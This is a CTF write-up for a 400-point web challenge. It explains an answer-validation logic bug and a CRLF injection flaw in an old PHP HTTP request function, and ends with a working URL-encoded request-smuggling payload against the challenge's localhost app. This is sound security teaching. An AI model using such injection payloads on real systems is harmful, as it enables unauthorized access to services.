# The Impossible Quiz (400 points)

This challenge is my personal favorite, as it consists of a mix
of logic bugs, code taken directly from the PHP website and a
vulnerability that you don't see often in CTFs.

## The application

The Impossible Quiz is meant to be an application that isn't
normally solvable. For that reason, the source code is made
available.

The web app asks us 3 questions, and goes through an odd
procedure in order to validate the answer:

1. The user sends the question and answer to `api.php`
2. The webapp does an HTTP request through the `validate()` function to determine
if the question/answer is correct.
3. The webapp spits the flag if you've successfully answered all 3 questions.

Here's what the validate function looks like :

```
function validate($question, $answer) {
    $url = "http://127.0.0.1/$question.php?answer=$answer";
    $r = new HTTPRequest($url);

    $response = $r->DownloadToString();
    $headers = $response->get_headers();
    $body = $response->get_body();

    if (stripos($body, "400 Bad Request") !== False ||
        stripos($body, "404 Not Found") !== False)
    {
      die("Hacker detected :/ What are you doing...");
    }

    return stripos($body, "The flagkeeper says yes.") !== False;
}
```

So if we want to validate the answer "test" for the question "question3",
the `validate()` function will send a request to
`http://127.0.0.1/question3.php?answer=test`.


Let's take a look at the question files :

Question 1:
```
<?php
  // [...]
  if (isset($_GET['answer']) and $_GET['answer'] === 'King Arthur of the Britons') {
     die("The flagkeeper says yes.");
  }

  die("The flagkeeper says nope :/");
?>
```

Question 2:
```
<?php
  // [...]
  if (isset($_GET['answer']) and $_GET['answer'] === 'I seek the Holy Grail!') {
     die("The flagkeeper says yes.");
  }

  die("The flagkeeper says nope :/");
?>
```

Question 3:
```
<?php
  // [...]
  // I WILL NEVER LET YOU PASS
  die("The flagkeeper says nope :/");
?>
```

Question 1 and 2 are obviously solvable, since the answer is in the source code.
However, question 3 can't be solved since "The flagkeeper says nope :/" will
always be returned.

## Logic bug

The first part that we have to understand is how `validate()` checks whether
an answer is correct or not.

```
    return stripos($body, "The flagkeeper says yes.") !== False;
```

`validate()` will return `True` if the sentence `The flagkeeper says yes.`
is **anywhere** in the response. Otherwise, return `False`. This means
that a `negative` response from the server is irrelevant. The only thing
being checked is wheter a `positive` message is in the  response.

Keep this in mind for the next part.


## HTTPRequest

There's probably 5+ different ways of sending an HTTP request. This one
has been taken from http://php.net/manual/en/function.fopen.php#58099 and
is 12 years old.

The issue with this function is that it's vulnerable to
[CRLF injection](https://www.owasp.org/index.php/CRLF_Injection), as shown
by this snippet :

```
   // generate request
        $req = 'GET ' . $this->_uri . ' HTTP/1.0' . $crlf
            .    'Host: ' . $this->_host . $crlf
            .    $crlf;
```

This allows us to perform [request smuggling](https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)#HTTP_Smuggling).

Essentially, we're appending keywords and newlines in the `$this->_uri` section
in order to craft a second response towards the end.

Let's say an HTTP request to `http://localhost/question3.php?answer=test`
looks like this:

```
GET /question3.php?answer=test HTTP/1.1
Host: localhost
```

By injecting `test HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nGET /question2.php?answer=test HTTP/1.1\r\nA: `, `httprequest.php` will end up sending :

```
GET /question3.php?answer=test HTTP/1.1
Host: 127.0.0.1

GET /question2.php?answer=test HTTP/1.1
A: HTTP/1.1
Host: localhost
```

... which will be interpreted as two requests by the webserver.
This also means that `HTTPRequest` will wait for the responses of
both requests before sending it to `validate()`.

## Solution

Since the application only checks for the existence of `The flagkeeper says yes.`
in the response, the solution here is to craft a request for `question3.php`
and smuggle a request to `question2.php` with the correct answer.

This will create in two responses :
1. The first response will be `The flagkeeper says no.` from the `question3.php` request.
2. The second response will be `The flagkeeper says yes.` from the smuggled `question2.php` request.

... resulting in `return stripos($body, "The flagkeeper says yes.") !== False;`
being true!

Here's the final URL and the resulting request :

```
http://localhost:23000/api.php?question=question3&answer=%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0AGET%20/question2.php?answer=I%2520seek%2520the%2520Holy%2520Grail!%20HTTP/1.1%0D%0AA:%20
```

```
GET /question3.php?answer= HTTP/1.1
Host: 127.0.0.1

GET /question2.php?answer=I%20seek%20the%20Holy%20Grail! HTTP/1.1
A: HTTP/1.0
Host: 127.0.0.1
```

